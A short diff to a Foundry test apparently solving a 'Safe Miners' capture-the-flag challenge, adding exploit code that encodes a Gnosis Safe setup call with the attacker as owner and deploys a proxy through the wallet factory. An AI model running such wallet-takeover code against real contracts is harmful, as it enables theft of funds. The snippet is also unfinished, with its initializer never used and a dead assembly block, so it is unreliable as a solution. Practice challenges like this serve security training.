@@ -47,7 +47,27 @@ contract SafeMiners is Test {
     }
 
     function testExploit() public {
+        assembly {
+            switch 1
+            case 0x0 {
+                revert(0x0, 0x0)
+            }
+        }
         /** EXPLOIT START **/
+        bytes memory initializer = abi.encodeWithSignature(
+            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+            attacker,
+            1,
+            address(0),
+            0,
+            address(0),
+            address(0),
+            uint256(0),
+            address(0)
+        );
+
+        bytes memory data;
+        walletFactory.createProxy(address(masterCopy), data);
         /** EXPLOIT END **/
         validation();
     }
